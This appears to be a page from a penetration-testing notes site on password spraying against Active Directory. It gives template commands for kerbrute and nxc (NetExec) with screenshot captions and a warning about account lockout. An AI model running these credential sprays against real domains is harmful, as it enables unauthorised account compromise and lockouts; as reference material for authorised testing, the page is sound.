# Password Spray

{% hint style="warning" %}
Accounts can be locked during the process.
{% endhint %}

## Kerbrute

If valid usernames are known, perform a password spray to find weak passwords:

```bash
kerbrute passwordspray <username_list> <password> -d <domain_name> --dc <dc_ip>
```

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption><p>Password spray using <code>kerbrute</code></p></figcaption></figure>

## NXC

Another method to spray passwords, particularly targeting various services:

```
nxc <service> <target> -u <username_list> -p <password> --continue-on-success
```

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption><p>Password spray using <code>nxc</code></p></figcaption></figure>

